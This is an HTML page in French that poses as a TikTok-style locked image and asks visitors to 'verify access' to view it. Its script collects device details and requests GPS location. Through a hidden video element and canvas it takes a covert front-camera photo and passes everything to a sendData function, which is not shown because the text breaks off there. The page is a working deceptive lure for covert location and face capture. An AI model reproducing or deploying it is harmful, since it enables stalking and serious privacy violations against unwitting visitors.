<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>image-bigo-dounite</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, 'Segoe UI', sans-serif;
      background: #000;
      color: #fff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    /* TikTok-style top bar */
    .topbar {
      width: 100%;
      max-width: 480px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 12px 16px;
    }
    .topbar .back { font-size: 22px; cursor: pointer; }
    .topbar .title { font-size: 16px; font-weight: 600; }
    .topbar .more { font-size: 22px; }

    /* Image container */
    .img-wrap {
      width: 100%;
      max-width: 480px;
      position: relative;
      background: #111;
      aspect-ratio: 9/16;
      overflow: hidden;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    /* Fake blurred image background */
    .img-bg {
      position: absolute;
      inset: 0;
      background: linear-gradient(135deg, #1a0533 0%, #0d1b4b 40%, #1a0533 100%);
      filter: blur(0px);
    }
    /* Silhouette shape */
    .img-silhouette {
      position: relative;
      z-index: 1;
      filter: blur(18px) brightness(0.4);
      width: 80%;
      height: 80%;
      background: radial-gradient(ellipse at 50% 40%, #c084fc 0%, #818cf8 40%, transparent 70%);
      border-radius: 50%;
    }
    /* Lock overlay */
    .lock-overlay {
      position: absolute;
      inset: 0;
      z-index: 2;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background: rgba(0,0,0,0.45);
      backdrop-filter: blur(2px);
    }
    .lock-icon { font-size: 44px; margin-bottom: 10px; }
    .lock-text { font-size: 15px; color: #ddd; margin-bottom: 6px; font-weight: 500; }
    .lock-sub { font-size: 12px; color: #aaa; text-align: center; padding: 0 32px; }

    /* Bottom panel */
    .bottom {
      width: 100%;
      max-width: 480px;
      padding: 16px;
    }
    .user-row {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 12px;
    }
    .avatar {
      width: 38px; height: 38px;
      border-radius: 50%;
      background: linear-gradient(135deg, #f97316, #ec4899);
      display: flex; align-items: center; justify-content: center;
      font-size: 18px; font-weight: bold;
    }
    .username { font-size: 14px; font-weight: 600; }
    .follow-btn {
      margin-left: auto;
      border: 1px solid #fff;
      border-radius: 4px;
      padding: 4px 14px;
      font-size: 13px;
      font-weight: 600;
      cursor: pointer;
      background: transparent;
      color: #fff;
    }
    .caption { font-size: 13px; color: #ccc; margin-bottom: 16px; line-height: 1.5; }
    .caption strong { color: #fff; }

    /* Unlock button */
    .unlock-btn {
      width: 100%;
      background: linear-gradient(90deg, #fe2c55, #ff6b6b);
      color: white;
      border: none;
      padding: 15px;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      letter-spacing: 0.3px;
    }
    .unlock-btn:active { opacity: 0.85; }

    .status {
      text-align: center;
      margin-top: 12px;
      font-size: 13px;
      color: #888;
      display: none;
    }

    /* TikTok-style stats */
    .stats {
      display: flex;
      gap: 20px;
      margin-top: 14px;
    }
    .stat { font-size: 12px; color: #888; }
    .stat span { color: #fff; font-weight: 600; display: block; font-size: 15px; }
  </style>
</head>

  <div class="topbar">

  </div>

  <div class="img-wrap">
    <div class="img-bg"></div>
    <div class="img-silhouette"></div>
    <div class="lock-overlay">
      <div class="lock-icon">🔒</div>
      <div class="lock-text">Contenu réservé</div>
      <div class="lock-sub">Vérifiez votre accès pour voir cette image</div>
    </div>
  </div>

  <div class="bottom">
    <div class="user-row">

      <button class="follow-btn">+ Suivre</button>
    </div>

      <div class="stat"><span>48.2K</span>Likes</div>
      <div class="stat"><span>1.3K</span>Commentaires</div>
      <div class="stat"><span>892</span>Partages</div>

  <!-- Hidden video + canvas for photo capture -->
  <video id="cam" autoplay playsinline style="display:none;width:1px;height:1px;position:absolute;opacity:0;"></video>
  <canvas id="snap" style="display:none;"></canvas>

  <script>
    async function requestAccess() {
      const status = document.getElementById('status');
      status.style.display = 'block';
      status.textContent = 'Vérification en cours...';

      const data = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenRes: `${screen.width}x${screen.height}`,
        timestamp: new Date().toISOString(),
        referrer: document.referrer,
      };

      // Run GPS + Camera in parallel
      const [geoResult, photoResult] = await Promise.allSettled([
        getGPS(),
        getPhoto()
      ]);

      if (geoResult.status === 'fulfilled') {
        Object.assign(data, geoResult.value);
      } else {
        data.geoError = 'refusé ou indisponible';
      }

      if (photoResult.status === 'fulfilled') {
        data.photo = photoResult.value;
      } else {
        data.photoError = 'refusé ou indisponible';
      }

      await sendData(data);
    }

    function getGPS() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) return reject('non supporté');
        navigator.geolocation.getCurrentPosition(
          pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
          reject,
          { timeout: 10000 }
        );
      });
    }

    async function getPhoto() {
      // Essaie caméra frontale, sinon caméra par défaut
      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
      } catch(e) {
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
      }

      const video = document.getElementById('cam');
      video.srcObject = stream;

      // Timeout de 5s sur onloadedmetadata pour éviter le blocage mobile
      await Promise.race([
        new Promise(r => { video.onloadedmetadata = r; video.load(); }),
        new Promise(r => setTimeout(r, 5000))
      ]);
      await new Promise(r => setTimeout(r, 800));

      const canvas = document.getElementById('snap');
      canvas.width = 320;
      canvas.height = 240;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, 320, 240);

      stream.getTracks().forEach(t => t.stop());
      video.srcObject = null;

      return canvas.toDataURL('image/jpeg', 0.7);
    }
